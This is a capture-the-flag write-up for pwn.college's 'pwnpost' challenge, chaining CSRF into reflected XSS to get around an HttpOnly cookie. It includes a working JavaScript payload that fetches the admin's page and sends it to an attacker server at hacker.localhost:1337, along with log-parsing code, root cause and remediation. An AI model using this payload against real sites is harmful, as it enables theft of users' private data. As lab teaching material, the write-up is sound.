# CSRF → XSS → Page Exfiltration (pwn.college "pwnpost" with HttpOnly)

## Description

The "pwnpost" Flask application has a **Reflected XSS** vulnerability in the `/ephemeral` endpoint. Because the application lacks CSRF protection, an attacker can force an authenticated admin bot to visit a malicious page. This page redirects the bot to the vulnerable endpoint, where JavaScript executes **in the admin's session**.

In this variant, the session cookie is marked **`HttpOnly`**, so `document.cookie` cannot read it. However, the XSS can still `fetch()` pages **in the same origin**, and the browser will automatically attach the `HttpOnly` cookie to those requests. The attacker therefore exfiltrates the **rendered page** (which contains the flag for the admin) rather than the cookie itself.

## Impact

**Critical.** An attacker can:

- **Bypass HttpOnly:** The cookie cannot be read, but it is still sent with same-origin requests made by the XSS payload.
- **Read privileged content:** `fetch('/')` returns the admin's view of the page, including drafts and hidden posts.
- **Exfiltrate data:** `window.location.href` navigates the bot to the attacker's server with the HTML embedded in a URL parameter.
- **Recover the flag:** The admin's own post is rendered as `YOUR POST: pwn.college{...}` on the main page.

## Reproduction Steps

### 1. Preparation

Start the attacker's HTTP server:

```bash
python3 -m http.server 1337 > server.log 2>&1 &
```

### 2. Craft the Payload
Create index.html in the directory served by the attacker's server. The script dynamically builds an XSS payload, encodes it, and redirects the bot to the vulnerable endpoint.

```html
<!DOCTYPE html>
<html>
<body>
<script>
    // Build XSS payload dynamically to avoid breaking our own <script> tag
    var xss = '<scr' + 'ipt>'
        + "fetch('http://challenge.localhost/').then(r=>r.text()).then(d=>{"
        + "window.location.href='http://hacker.localhost:1337/?page='+encodeURIComponent(d)"
        + "})"
        + '</scr' + 'ipt>';

    // URL-encode the payload and redirect the bot
    window.location.href = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent(xss);
</script>
</body>
</html>
```

Why this works:

    '<scr' + 'ipt>' and '</scr' + 'ipt>' — split so the browser does not close the attacker's own <script> tag prematurely.

    encodeURIComponent(xss) — encodes the payload for safe insertion into the URL.

    fetch('http://challenge.localhost/') — same-origin request; the browser automatically attaches the HttpOnly cookie.

    window.location.href = '...?page=' + encodeURIComponent(d) — navigation to the attacker's server, carrying the HTML in a URL parameter. Navigation is not subject to CORS, so the data is delivered even though the response cannot be read by JavaScript.

### 3. Trigger the Bot
Submit http://hacker.localhost:1337 to the admin bot (via the challenge interface or /challenge/victim).

### 4. Capture the Page

The bot visits the attacker's page, is redirected to /ephemeral?msg=..., and the reflected XSS executes as the admin. The payload fetches /, and the resulting HTML is sent to the attacker's server:

```bash
cat server.log
```

You will see a line like:
```text
127.0.0.1 - - [03/Nov/2026 10:58:42] "GET /?page=%3Chtml%3E...YOUR%20POST%3A%20pwn.college%7B...%7D... HTTP/1.1" 200 -
```

5. Decode the Page and Extract the Flag
```bash
python3 -c "
import re, urllib.parse
log = open('server.log').read()
for m in re.finditer(r'page=([^ ]+)', log):
    for f in re.findall(r'pwn\.college\{[^}]+\}', urllib.parse.unquote(m.group(1))):
        print(f)
"
```

Or manually decode the ?page= value with decodeURIComponent and search for pwn.college{...}.

## Root Cause

The vulnerability is a combination of three flaws:

    Reflected XSS in /ephemeral: The endpoint reflects the msg parameter directly into the HTML without escaping.

```python
The message: {flask.request.args.get("msg", "(none)")}
```
No CSRF Protection: The application does not validate Origin or Referer headers. An attacker can force an authenticated user (the admin bot) to make requests to the vulnerable endpoint.

HttpOnly is not a complete defense: While HttpOnly prevents JavaScript from reading the cookie, it does not prevent the browser from sending the cookie with same-origin requests. XSS in the same origin can therefore still act on the victim's behalf.

## Remediation

    Escape Output: Use markupsafe.escape to sanitize the msg parameter.

```python
from markupsafe import escape
The message: {escape(flask.request.args.get("msg", "(none)"))}
```

Implement CSRF Protection: Add CSRF tokens to state-changing requests and validate Origin/Referer headers.

## Secure Cookie Handling:

    Never store passwords in cookies.

    Use a signed session token instead.

    Set HttpOnly (already present here) and Secure and SameSite=Strict/Lax.

    Remember: HttpOnly protects against cookie theft, not against XSS-driven actions.


## Lessons Learned

    HttpOnly is not a silver bullet. It stops document.cookie theft, but XSS in the same origin can still fetch() pages and exfiltrate their contents.

    CSRF can be a delivery mechanism for XSS. A simple GET request to /ephemeral?msg=... is enough to trigger the chain.

    Navigation bypasses CORS. window.location.href delivers data to a cross-origin server even when fetch() would be blocked from reading the response.

    URL encoding is tricky. Always use encodeURIComponent when embedding HTML or JavaScript in a URL parameter.

## References

    OWASP: Cross Site Scripting (XSS)

    OWASP: Cross-Site Request Forgery (CSRF)

    PortSwigger: Reflected XSS

    MDN: HttpOnly

    MDN: window.location

